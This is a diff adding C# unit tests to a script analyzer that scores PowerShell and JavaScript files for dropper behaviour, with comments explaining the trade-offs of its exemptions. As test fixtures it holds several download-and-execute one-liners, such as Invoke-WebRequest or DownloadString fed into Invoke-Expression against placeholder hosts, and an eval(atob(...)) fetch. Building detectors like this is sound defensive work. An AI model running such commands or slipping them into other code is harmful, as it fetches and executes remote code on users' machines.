@@ -50,6 +50,56 @@ public class ScriptAnalyzerTests
         Assert.All(signals, s => Assert.Equal(0, s.Points));
     }
 
+    /// <summary>
+    /// The exemption is for the manifest *shape*, not the extension. `powershell -File
+    /// payload.psd1` runs the file as an ordinary script, so trusting the name alone
+    /// meant a dropper could rename itself and lose 35 points for free.
+    /// </summary>
+    [Fact]
+    public void A_dropper_renamed_to_psd1_is_still_scored()
+    {
+        const string dropper =
+            "Invoke-WebRequest -Uri http://203.0.113.5/x.ps1 -OutFile x.ps1; " +
+            "Invoke-Expression (Get-Content x.ps1 -Raw)";
+
+        var signals = ScriptAnalyzer.Analyse(dropper, ScriptKind.PowerShellData);
+
+        Assert.Contains(signals, s => s.Code == "script-download-and-run" && s.Points > 0);
+    }
+
+    /// <summary>A hashtable carrying a subexpression still executes when the file is
+    /// dot-sourced, so it is not the inert data this exemption is for.</summary>
+    [Fact]
+    public void A_manifest_shaped_file_containing_a_subexpression_is_still_scored()
+    {
+        const string sneaky = "@{ ModuleVersion = $(Invoke-Expression (New-Object Net.WebClient).DownloadString('http://x/y')) }";
+
+        Assert.False(ScriptAnalyzer.LooksLikeModuleManifest(sneaky));
+
+        var signals = ScriptAnalyzer.Analyse(sneaky, ScriptKind.PowerShellData);
+        Assert.Contains(signals, s => s.Code == "script-download-and-run" && s.Points > 0);
+    }
+
+    /// <summary>A genuine manifest, comments and all, is still recognised as data.</summary>
+    [Fact]
+    public void A_real_module_manifest_is_recognised_as_data()
+    {
+        const string manifest = """
+            <#
+                Module manifest for Microsoft.PowerShell.Utility
+            #>
+            @{
+            GUID="1DA87E53-152B-403E-98DC-74D7B4D63D59"   # identity
+            Author="Microsoft Corporation"
+            CmdletsToExport="Invoke-Expression", "Invoke-WebRequest", "Invoke-RestMethod"
+            }
+            """;
+
+        Assert.True(ScriptAnalyzer.LooksLikeModuleManifest(manifest));
+        Assert.All(ScriptAnalyzer.Analyse(manifest, ScriptKind.PowerShellData),
+            s => Assert.Equal(0, s.Points));
+    }
+
     /// <summary>The same text in a real script is still reported: the exemption is for
     /// the manifest format, not for the words.</summary>
     [Fact]
@@ -168,9 +218,55 @@ public class ScriptAnalyzerTests
     }
 
     [Fact]
-    public void Javascript_atob_is_reported()
+    public void Javascript_atob_is_recorded_but_not_scored()
     {
-        Assert.Contains("script-base64-payload", Codes("eval(atob('dmFyIHggPSAx'));", ScriptKind.JavaScript));
+        const string script = "eval(atob('dmFyIHggPSAx'));";
+
+        var signals = ScriptAnalyzer.Analyse(script, ScriptKind.JavaScript);
+
+        // Recorded, so opening the finding shows it...
+        Assert.Contains(signals, s => s.Code == "script-base64-payload");
+
+        // ...but worth nothing, which is the deliberate part. The old name said
+        // "is_reported" and asserted only that the code appeared, so it would have
+        // passed whatever the weight was. That is the shape of test that lets a
+        // detection quietly become a no-op.
+        Assert.All(signals, s => Assert.Equal(0, s.Points));
+    }
+
+    /// <summary>
+    /// The cost of the rule above, stated as a test so it cannot be forgotten: a small
+    /// hand-written JavaScript dropper scores nothing from the obfuscation rules.
+    ///
+    /// This is measured, not assumed. Grading small non-minified JavaScript normally
+    /// was tried against a real project: 420 files under 2 KB would have been flagged,
+    /// and every one sampled was ordinary lodash -- compact.js, curry.js, defaultTo.js
+    /// -- caught for the \u escapes in their own doc comments. Restricting the
+    /// exemption to minified files is worse still, since only 2,140 of 18,867 .js files
+    /// in that project are minified.
+    ///
+    /// What covers the case that actually matters on Windows is the Windows Script Host
+    /// surface, which the next test pins.
+    /// </summary>
+    [Fact]
+    public void A_small_javascript_dropper_is_not_scored_by_the_obfuscation_rules()
+    {
+        const string dropper = "eval(atob('ZmV0Y2goJ2h0dHA6Ly94L3knKQ=='));";
+
+        Assert.All(ScriptAnalyzer.Analyse(dropper, ScriptKind.JavaScript),
+            s => Assert.Equal(0, s.Points));
+    }
+
+    /// <summary>What does still catch a .js file meant to run on Windows.</summary>
+    [Fact]
+    public void A_javascript_dropper_using_windows_script_host_is_scored()
+    {
+        const string dropper =
+            @"var s = new ActiveXObject(""WScript.Shell""); s.Run(""calc.exe"");";
+
+        var signals = ScriptAnalyzer.Analyse(dropper, ScriptKind.JavaScript);
+
+        Assert.Contains(signals, s => s.Code == "script-windows-script-host" && s.Points > 0);
     }
 
     [Fact]
